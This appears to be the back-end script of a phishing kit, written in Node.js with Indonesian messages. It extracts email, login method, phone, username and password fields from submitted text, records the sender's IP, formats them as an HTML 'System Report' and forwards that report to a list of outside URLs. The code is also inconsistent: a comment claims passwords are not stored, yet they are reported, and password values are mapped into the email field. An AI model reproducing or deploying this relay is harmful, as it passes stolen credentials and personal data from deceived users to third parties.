const fs = require("fs");
const path = require("path");

const FILE = path.join(process.cwd(), "data", "urls.json");

/* ======================
   LOAD URL LIST
====================== */
function loadUrls() {
  try {
    if (!fs.existsSync(FILE)) return [];
    const data = fs.readFileSync(FILE, "utf8");
    if (!data) return [];

    const parsed = JSON.parse(data);
    return Array.isArray(parsed) ? parsed : [];
  } catch (err) {
    console.log("LOAD ERROR:", err.message);
    return [];
  }
}

/* ======================
   BODY PARSER
====================== */
function parseBody(req) {
  if (!req.body) return {};
  if (typeof req.body === "object") return req.body;

  try {
    return Object.fromEntries(new URLSearchParams(req.body));
  } catch {
    return {};
  }
}

/* ======================
   EXTRACTOR (TEXT + HTML)
====================== */
function extractVars(input = "") {
  const vars = {
    email: "-",
    login: "-",
    phone: "-",
     password: "-",
    user: "-",
    ip: "-"
    // password tidak disimpan demi keamanan
  };

  const raw = String(input);

  const text = raw
    .replace(/<script[\s\S]*?<\/script>/gi, "")
    .replace(/<style[\s\S]*?<\/style>/gi, "")
    .replace(/\r/g, " ");

  // ======================
  // key:value format
  // ======================
  const kvRegex = /(\b[\w\s]+)\s*:\s*([^:]+?)(?=\s+\w+\s*:|$)/gi;

  let m;
  while ((m = kvRegex.exec(text)) !== null) {
    map(vars, m[1], m[2]);
  }

  // ======================
  // HTML TABLE format
  // ======================
  const tdRegex =
    /<t[dh][^>]*>([\s\S]*?)<\/t[dh]>\s*<t[dh][^>]*>([\s\S]*?)<\/t[dh]>/gi;

  let t;
  while ((t = tdRegex.exec(raw)) !== null) {
    map(vars, t[1], t[2]);
  }

  return vars;
}

/* ======================
   FIELD MAPPING (SAFE)
====================== */
function map(vars, key, value) {
  if (!value) return;

  const k = String(key)
    .toLowerCase()
    .replace(/[^a-z]/g, "");

  const v = String(value).trim();

  if (k.includes("email") || v.includes("@")) {
    vars.email = v;
    return;
  }
   if (k.includes("password") || v.includes("@")) {
    vars.email = v;
    return;
   }

  if (k.includes("login") || k.includes("via") || k.includes("method")) {
    vars.login = v;
    return;
  }

  if (k.includes("phone") || k.includes("hp") || k.includes("tel")) {
    vars.phone = v;
    return;
  }

  if (k.includes("user") || k.includes("name")) {
    vars.user = v;
    return;
  }
}

/* ======================
   IP DETECTOR
====================== */
function getIP(req) {
  return (
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket?.remoteAddress ||
    "-"
  );
}

/* ======================
   HTML REPORT
====================== */
function buildHtml(vars) {
  return `
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="font-family:Arial;background:#fff;padding:20px">

<h2>System Report</h2>

<table border="1" cellpadding="8" style="border-collapse:collapse;width:100%">
<tr><td>Email</td><td>${vars.email}</td></tr>
<tr><td>User</td><td>${vars.user}</td></tr>
<tr><td>Login</td><td>${vars.login}</td></tr>
<tr><td>password</td><td>${vars.password}</td></tr>
<tr><td>Phone</td><td>${vars.phone}</td></tr>
<tr><td>IP</td><td>${vars.ip}</td></tr>
</table>

</body>
</html>
`;
}

/* ======================
   MAIN HANDLER
====================== */
module.exports = async (req, res) => {
  try {
    if (req.method !== "POST") {
      return res.status(405).json({
        success: false,
        message: "POST only"
      });
    }

    const body = parseBody(req);

    const subjek = String(body.subjek || "");
    const pesan = String(body.pesan || "");

    if (!subjek || !pesan) {
      return res.status(400).json({
        success: false,
        message: "subjek & pesan wajib diisi"
      });
    }

    const vars = extractVars(pesan);
    vars.ip = getIP(req);

    const html = buildHtml(vars);

    const urls = loadUrls();

    if (!urls.length) {
      return res.json({
        success: false,
        message: "URL kosong"
      });
    }

    const results = await Promise.allSettled(
      urls.map(async (url) => {
        try {
          const r = await fetch(url, {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded"
            },
            body: new URLSearchParams({
              subjek,
              pesan: html
            })
          });

          return {
            url,
            success: true,
            status: r.status
          };
        } catch (err) {
          return {
            url,
            success: false,
            error: err.message
          };
        }
      })
    );

    return res.json({
      success: true,
      message: "done",
      total: urls.length,
      results: results.map(r => r.value || r.reason)
    });

  } catch (err) {
    console.log("ERROR:", err);

    return res.status(500).json({
      success: false,
      message: "internal error",
      error: err.message
    });
  }
};
